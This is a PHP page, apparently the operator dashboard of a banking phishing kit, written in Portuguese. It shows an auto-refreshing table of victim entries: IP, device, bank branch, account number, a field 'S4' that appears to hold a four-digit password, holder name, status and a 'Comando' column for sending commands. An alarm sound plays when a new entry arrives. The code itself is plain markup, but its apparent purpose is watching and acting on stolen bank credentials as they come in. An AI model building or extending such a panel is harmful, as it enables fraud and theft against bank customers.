<?php
require_once 'config.php';
include 'validaLogin.php';
getHeader();
?>
<div class="container-fluid">
<div class="pt-5">
    <?php
        $infos = Info::buscarTodos();
    ?>
    <div class="container-fluid mb-3" style="padding: 0px;">
        <div class="row">
          <div class="col-6">
            <span class="contador"><span id="quantidade"><?php echo count($infos);?></span> Info(s)</span>
            <a href="javascript:;" class="excluirTodos">Excluir Todos</a>
            <a href="javascript:;" class="silenciar">Silenciar</a>
          </div>
          <div class="col-6 text-right pt-1">
            <a id="controlarContador" class="contador" href="">Parar / Iniciar</a>
            <span id="timer" class="contador">Atualizar em: <span id="segundos"></span> segundos</span>
          </div>
        </div>
    </div>
    
    <table id="infos" class="table">
        <thead>
          <tr>
            <th scope="col">#</th>
            <th scope="col">IP</th>
            <th scope="col">Data Hora</th>
            <th scope="col">Device</th>
            <th scope="col">Agência</th>
            <th scope="col">Conta</th>
            <th scope="col">Tipo</th>
            <th scope="col">S4</th>
            <th scope="col">Titular</th>
            <th scope="col">Nome</th>
            <th scope="col">Status</th>
            <th scope="col">Comando</th>
            <th class="text-center" scope="col">Opções</th>
          </tr>
        </thead>
        <tbody>
  

        </tbody>
        
      </table>

</div>
</div>
<audio id="myAudioNovaInfo" loop>
  <source src="myAudioNovaInfo.mp3" type="audio/mpeg">
</audio>

<?php
getFooter(['js/infos.js']);
?>